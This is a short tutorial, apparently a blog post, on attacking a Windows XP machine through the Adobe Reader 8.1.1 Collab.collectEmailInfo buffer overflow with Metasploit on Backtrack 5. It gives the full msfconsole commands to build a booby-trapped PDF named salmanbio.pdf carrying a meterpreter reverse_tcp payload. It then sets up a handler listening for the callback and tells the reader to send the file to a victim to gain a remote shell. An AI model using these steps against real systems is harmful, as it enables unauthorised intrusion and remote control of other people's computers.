Attack on Remote PC with Adobe Collab.collect Email Info() Buffer Overflow

This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional 8.1.1. By creating a specially crafted pdf that a contains malformed Collab.collectEmailInfo () call, an attacker may be able to execute arbitrary code
Adobe Reader v8.1.1
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/adobe_collectemailinfo
Msf exploit (adobe_collectemailinfo)>set payload windows/meterpreter/reverse_tcp
Msf exploit (adobe_collectemailinfo)>set lhost 192.168.1.4 (IP of Local Host)
Msf exploit (adobe_collectemailinfo)>set filename salmanbio.pdf
Msf exploit (adobe_collectemailinfo)>exploit

After we successfully generate the malicious PDF, it will stored on your local computer
/root/.msf4/local/salmanbio.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.4
exploit 
Now send your salmanbio.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
